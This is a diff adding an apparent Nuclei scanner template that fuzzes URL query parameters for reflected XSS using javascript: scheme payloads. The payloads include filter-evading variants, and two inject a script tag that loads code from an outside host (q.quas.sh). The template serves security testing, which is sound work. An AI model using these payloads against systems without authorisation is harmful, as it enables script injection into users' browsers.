@@ -1,0 +1,46 @@
+id: xss-fuzz-javascript-schema-url-injection
+
+info:
+  name: Reflected XSS Checks via javascript schema urls
+  author: quas
+  severity: medium
+  description: Fuzzes all query parameters for various reflected XSS vulnerabilities via javascript schema URLs.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    payloads:
+      xss_payloads:
+        - "javascript:alert(document.domain)"
+        - "javascript:alert\\u0028document.domain\\u0029"
+        - "javasjavascriptcript:alert(document.domain)"
+        - "javjavascriptascript:alert\\u0028document.domain\\u0029"
+        - "location='javascript:alert(document.domain)'"
+        - "location=\"javascript:alert(document.domain)\""
+        - "location='javasjavascriptcript:alert(document.domain)'"
+        - "location=\"javajavascriptscript:alert(document.domain)\""
+        - "javascript:eval('var a=document.createElement(\'script\');a.src=\'https://q.quas.sh\';document.body.appendChild(a)')"
+        - "javascript:eval(\"var a=document.createElement(\\\"script\\\");a.src=\\\"https://q.quas.sh\\\";document.body.appendChild(a)\")"
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(xss_payloads)}}"
+          - "{{url_encode(url_encode(xss_payloads))}}"
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "(?i)href\\s*=\\s*[\"']?javascript:alert\\(document.domain\\)"
+          - "(?i)action\\s*=\\s*[\"']?javascript:alert\\(document.domain\\)"
+          - "(?i)href\\s*=\\s*[\"']?javascript:alert\\\\u0028document.domain\\\\u0029"
+          - "(?i)onclick\\s*=\\s*[\"]?location='javascript:alert\\(document.domain\\)'"
+          - "(?i)onclick\\s*=\\s*[']?location=\"javascript:alert\\(document.domain\\)\""
+      - type: word
+        part: header
+        words:
+          - "text/html"
+
